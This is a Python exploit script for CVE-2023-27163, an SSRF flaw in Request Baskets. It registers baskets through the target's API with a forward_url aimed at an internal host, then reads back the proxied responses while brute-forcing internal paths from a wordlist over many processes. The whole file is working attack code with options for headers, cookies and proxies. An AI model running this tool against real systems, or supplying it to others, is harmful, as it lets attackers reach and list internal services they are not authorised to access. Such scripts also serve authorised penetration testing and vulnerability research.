from multiprocessing import Pool
import requests
import argparse
import signal
import random
import string

class Baskets():
    def __init__(self,url,wordlist,extensions,output_file,threads,ssrf_target,header,cookie,user_agent,proxy):
        self.url = self.check_url(url)
        self.file = wordlist
        self.extensions = extensions
        self.output_file = output_file
        self.threads = threads
        self.ssrf_target = self.check_url(ssrf_target)
        self.header = header
        self.cookie = cookie
        self.user_agent = user_agent
        self.proxy = proxy

        if args.e:
            self.ext_list = self.create_extensions()
        self.headers,self.proxy_set = self.create_headers()
        self.set_processes_wordlist()
    
    def create_extensions(self):
        ext_list = self.extensions.split()
        ext_list.insert(0,"")

        return ext_list

    def check_url(self,url):
        check = url[-1]
        if check == "/": 
            return url
        else:
            fixed_url = url + "/"
            return fixed_url

    def create_headers(self):
        headers = {
            "Connection":"close",
            "Content-Type":"application/json"
        }

        proxy_set = {}
        if args.a:
            headers["User-Agent"] = self.user_agent
        if args.p:
            proxy_set = {
                "http": "http://" + self.proxy
                }
        if args.c:
            headers['Cookie'] = self.cookie
        if args.H:
            header_list = self.header.split(': ')
            list_length = len(header_list) - 1
            for each_header in range(0,list_length):
                headers[header_list[each_header]] = header_list[each_header + 1]

        return headers,proxy_set

    def write_output(self,line1,line2,line3):
        print(line1)
        print(line2)
        print(line3)
        out_file = open(self.output_file,'a')
        out_file.write(line1)
        out_file.write("\n")
        out_file.write(line2)
        out_file.write(line3)
        out_file.write("\n")
        out_file.close()

    def set_processes_wordlist(self):
        original_sigint_handler = signal.signal(signal.SIGINT, signal.SIG_IGN)
        pool = Pool(processes=int(self.threads)) 
        signal.signal(signal.SIGINT, original_sigint_handler)

        wordlist = []
        with open(self.file,'r') as wordlist_file: 
            for each_word in wordlist_file: 
                if args.e:
                    for ext in self.ext_list:
                        if each_word.find("#") != -1:
                            continue
                        word_ext = each_word.strip() + ext
                        wordlist.append(word_ext.strip())
                else:
                    if each_word.find("#") != -1:
                            continue
                    wordlist.append(each_word.strip())

        try:
            start = pool.map_async(self.ssrf_exploit,wordlist)
        except KeyboardInterrupt:
            pool.terminate()
        else:
            pool.close()
        pool.join()

    def ssrf_exploit(self,each_line):
        requests.packages.urllib3.disable_warnings()
        characters = string.ascii_letters + string.digits
        basket = ''.join(random.choice(characters) for _ in range(15))
        payload = {
          "forward_url": self.ssrf_target + each_line,
          "proxy_response": True,
          "insecure_tls": False,
          "expand_path": True,
          "capacity": 1000
        }
        api_basket_url = self.url + "api/baskets/" + basket
        requests.post(api_basket_url, json=payload, headers=self.headers, proxies=self.proxy_set, allow_redirects = False, verify=False)
        
        ssrf_payload = requests.get(self.url + basket, headers=self.headers, proxies=self.proxy_set, allow_redirects = False, verify=False)
        if len(ssrf_payload.text) > 0 and not "Failed" in ssrf_payload.text:    
            print("Endpoint found: " + each_line + "\tView page at: " + ssrf_payload.url)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CVE-2023-27163 Requests Baskets SSRF Exploit')
    parser.add_argument('-u', metavar='<Target URL>', help='Example: -u http://requests.basket/', required=True)
    parser.add_argument('-w', metavar='<Wordlist file>',help="Example: -w unix.txt", required=True)
    parser.add_argument('-e', metavar='<extensions>',help="Example: -e '.ext1 .ext2 .ext3'", required=False)
    parser.add_argument('-o', metavar='<Output file>',help="Example: -o output.txt", required=False)
    parser.add_argument('-t', metavar='<Threads>',default="5",help="Example: -t 100. Default 5", required=False)
    parser.add_argument('-s', metavar='<SSRF Target>', help='Example: -u http://forbidden.target/', required=True)
    parser.add_argument('-H', metavar='<Header>',help="Example: -H 'Parameter: Value", required=False)
    parser.add_argument('-c', metavar='<Cookie>',help="Example: -c 'Cookie Value", required=False)
    parser.add_argument('-a', metavar='<User-Agent>',help="Example: -a Linux", required=False)
    parser.add_argument('-p', metavar='<Proxies>',help="Example: -p 127.0.0.1:8080", required=False)
    args = parser.parse_args()

    try:
        Baskets(args.u,args.w,args.e,args.o,args.t,args.s,args.H,args.c,args.a,args.p)
    except KeyboardInterrupt:
        print("\nBye Bye!")
        exit()